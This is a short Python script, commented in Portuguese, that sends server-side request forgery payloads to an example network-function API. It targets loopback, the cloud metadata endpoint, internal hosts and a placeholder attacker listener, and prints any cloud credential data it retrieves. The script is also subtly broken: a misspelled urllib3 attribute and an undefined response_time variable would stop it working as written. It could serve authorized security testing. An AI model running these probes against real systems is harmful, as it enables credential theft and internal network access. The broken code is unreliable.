import requests
import urllib3
import json
import time

urllib3.disable_warnings(urllib3.exeptions.InsecureRequestWarning)

#Configurações de teste
NF_API_URL = "https://127.0.0.1:8000/api/resource_loader" #Exemplo de NF com funcionalidade de carregar URL
TARGET_PARAMETER = "url"

#Endepoints internos e externos para testar
test_endpoints = [
    "http://127.0.0.1:80", #Loopback HTTP
    "http://169.254.169.254/latest/meta-data", #Metadados de nuvem (AWS/OpenStack)
    "http://[IP_INTERNO_DA_NF]:[PORTA_DO_SERVICO]", #Outra NF na rede interna
    "https://[SEU_IP_DE_ATAQUE]:8080" #URL para um servidor extermp (listener)
]

print("[+] Testando Server-Side Request Forhery (SSRF)...")

for url in test_endpoints:
    payload = {TARGET_PARAMETER: url}
    print(f"[*] Tentando injetar URL: {url}")
    try:
        start_time = time.time()
        response = requests.post(NF_API_URL, headers={"Content-Type": "application/json"}, data=json.dumps(payload), timeout=5, verify=False)
        end_time = time.time()

        #Analisar a resposta por conteúdo ou código de status HTTP
        if response.status_code == 200 and "security-credentials" in response.text:
            print("[!!!] VULNERABILIDADE SSRF DETECTADA! Acesso a metadados de nuvem.")
            print(f"      Conteúdo do recurso: {response.text}")
            break

        if response.status_code == 200 or response.status_code == 302:
            print(f"[!] Possível SSRF detectada! Status {response.status_code} na URL '{url}'.")

        #Analisar por tempo de resposta (para SSRF blind)
        if response_time > 3:
            print(f"[!] Possível SSRF Blind detectada! Requisição para '{url}' demorou {response_time:.2f} segundos.")
    except requests.exceptions.RequestException as e:
        print(f"[-] Erro ao injetar URL '{url}': {e}")